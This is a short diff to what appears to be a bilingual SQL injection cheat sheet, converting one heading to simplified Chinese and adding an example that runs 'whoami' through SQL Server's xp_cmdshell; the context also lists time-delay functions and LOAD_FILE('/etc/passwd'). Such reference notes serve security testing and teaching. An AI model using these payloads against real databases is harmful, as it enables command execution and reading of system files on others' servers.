@@ -801,7 +801,7 @@ pop graphic-context
 - Delay function
     - `sleep(5)`
     - `BENCHMARK(count, expr)`
-- 空白字元
+- 空白字符
     - `09 0A 0B 0C 0D A0 20`
 - File-read function
     - `LOAD_FILE('/etc/passwd')`
@@ -1138,6 +1138,12 @@ pop graphic-context
     RECONFIGURE;
     EXEC sp_configure'xp_cmdshell', 0;
     RECONFIGURE;
+    ```
+
+    - 执行系统命令
+
+    ```
+    EXEC master..xp_cmdshell 'whoami';
     ```
 
 - 快速查找带关键字的表
